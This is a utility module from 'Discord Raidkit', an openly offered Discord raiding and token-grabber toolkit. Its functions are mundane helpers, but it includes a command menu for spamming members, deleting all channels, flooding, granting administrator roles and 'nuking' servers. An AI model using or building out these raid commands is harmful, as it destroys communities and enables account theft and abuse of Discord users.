"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

utils.py stores various utility functions used throughout the Discord Raidkit suite.
utils.py was last updated on 05/03/23 at 20:46 UTC.
"""

import logging
import os
from pathlib import Path

from colorama import init, Fore

init()


def clear_screen() -> int: 
    return os.system('cls' if os.name == 'nt' else 'clear')


def repeat_prompt_until_valid_input(prompt: str, valid_input: str) -> str:
    """Repeats a prompt until the user enters a valid input."""
    clear_screen()
    user_input = input(prompt)
    if user_input in valid_input:
        return user_input
    else:
        return repeat_prompt_until_valid_input(prompt, valid_input)


def init_logger() -> None:
    """Initializes the logger."""
    logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                        filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')


def mkfile(filepath: str, content: str = '') -> bool:
    """Make a file if it doesn't exist, including any missing directories in the filepath.
    Args:
        filepath (str): the path to the file to be created.
        content (str, optional): the content to be written to the file. Defaults to "".
    Returns:
        bool: True if no errors were raised, False otherwise.
    """
    try:
        file = Path(filepath)
        file.parent.mkdir(exist_ok=True, parents=True)
        if content:
            file.write_text(content)
        return True
    except Exception as e:
        logging.error(f'Error in utils.py - mkfile(): {e}')
        return False


def menu_str(prefix: str) -> str:
    """Returns the menu string for raiders."""
    return f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's raiding utility!

{Fore.LIGHTBLUE_EX}{prefix}nick_all <nickname> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}changes the nickname of all members in the server.
{Fore.LIGHTBLUE_EX}{prefix}msg_all <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}sends a message to all members in the server.
{Fore.LIGHTBLUE_EX}{prefix}spam <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}spams a message in all channels in the server.
{Fore.LIGHTBLUE_EX}{prefix}cpurge {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}deletes all channels in the server.
{Fore.LIGHTBLUE_EX}{prefix}cflood <amount> <name> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}creates a specified amount of channels with a specified name.
{Fore.LIGHTBLUE_EX}{prefix}raid <role_name> <nickname> <amount> <name> <message> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}role and nick all users in a server, then run cflood and spam
{Fore.LIGHTBLUE_EX}{prefix}admin <member> <role_name> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}give a member a new role with administrator permissions.
{Fore.LIGHTBLUE_EX}{prefix}nuke {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}completely nuke a server.
{Fore.LIGHTBLUE_EX}{prefix}mass_nuke {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}completely nuke all servers the bot is in.
{Fore.LIGHTBLUE_EX}{prefix}leave <server_id> {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}leave a server.
{Fore.LIGHTBLUE_EX}{prefix}mass_leave {Fore.LIGHTWHITE_EX}- {Fore.LIGHTYELLOW_EX}leave all servers the bot is in.

{Fore.RED}Warning {Fore.LIGHTWHITE_EX}: {Fore.LIGHTRED_EX}make sure your bot's role is higher than the roles of those you wish to affect.

{Fore.LIGHTWHITE_EX}"""
